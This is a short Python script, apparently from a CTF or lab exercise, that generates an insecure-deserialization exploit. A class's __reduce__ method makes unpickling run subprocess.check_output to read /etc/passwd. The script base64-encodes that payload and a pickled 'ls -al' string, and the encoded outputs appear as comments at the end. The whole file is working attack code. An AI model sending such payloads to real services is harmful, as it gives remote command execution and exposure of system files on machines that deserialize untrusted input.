import requests
import base64
import pickle
import subprocess

# 1. สร้าง Payload (เหมือนเดิม)
class Exploit:
    def __reduce__(self):
        return (subprocess.check_output, (['cat', '/etc/passwd'],))

payload_bytes = pickle.dumps(Exploit())
payload_base64 = base64.b64encode(payload_bytes).decode()

print("'cat', '/etc/passwd' base64\n"+payload_base64)



cmd = "ls -al"  
payload = base64.urlsafe_b64encode(pickle.dumps(cmd)).decode()
print("\nls base64\n"+payload)


## gASVBgAAAAAAAACMAmxzlC4=
## gASVOwAAAAAAAACMCnN1YnByb2Nlc3OUjAxjaGVja19vdXRwdXSUk5RdlCiMA2NhdJSMCy9ldGMvcGFzc3dklGWFlFKULg==